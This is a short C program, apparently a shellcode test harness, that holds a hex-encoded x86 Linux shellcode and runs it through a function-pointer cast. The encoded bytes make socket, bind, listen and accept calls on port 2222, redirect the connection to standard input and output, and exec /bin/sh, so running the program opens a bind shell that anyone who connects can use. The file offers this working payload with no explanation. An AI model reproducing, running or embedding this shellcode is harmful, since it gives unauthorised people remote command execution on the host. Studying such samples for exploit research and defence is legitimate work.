#include <stdio.h>
#include <string.h>

// the shellcode is stored here
unsigned char code[] = \
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
	// print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
	
	// convert shellcode to a function
	int (*ret)() = (int(*)())code;

	// execute the shellcode
	ret();

}


